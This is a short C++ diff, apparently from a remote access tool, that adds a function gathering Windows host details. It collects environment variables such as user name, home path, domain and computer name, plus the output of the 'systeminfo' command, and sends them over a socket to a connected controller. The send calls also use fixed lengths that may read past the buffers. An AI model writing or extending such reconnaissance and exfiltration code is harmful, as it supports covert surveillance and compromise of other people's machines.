@@ -167,3 +167,30 @@ void Transfer::getTemp(Client* client)
 	}
 	
 }
+
+void InfoClient::getsysinfo(Client* client)
+{
+	std::string buffer;
+	std::string user = getenv("USERNAME");
+	std::string userhome = getenv("HOMEPATH");
+	std::string windir = getenv("windir");
+	std::string localappdate = getenv("LOCALAPPDATA");
+	std::string systemdrive = getenv("SystemDrive");
+	std::string OS = getenv("OS");
+	std::string userdomain = getenv("USERDOMAIN");
+	std::string computername = getenv("COMPUTERNAME");
+	std::string proco = getenv("PROCESSOR_IDENTIFIER");
+
+	buffer = "\nCurrent user :\t\t" + user + "\nUser directory :\t\t" + userhome + "\nWindows directory :\t\t" + windir + "\nLocal Appdata :\t\t" + localappdate;
+	buffer += "\nSystem drive :\t\t" + systemdrive + "\nOS :\t\t" + OS + "\nComputer name :\t\t" + computername + "\nProcessor identifier :\t\t" + proco;
+	client->send_b(buffer.c_str());
+	
+	std::string ret = Shell::return_command("systeminfo");
+	std::cout << ret << std::endl;
+	if (ret != "")
+	{
+		send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
+		send(*client->getSock(), ret.c_str(), HUGE, 0);
+	}
+
+}
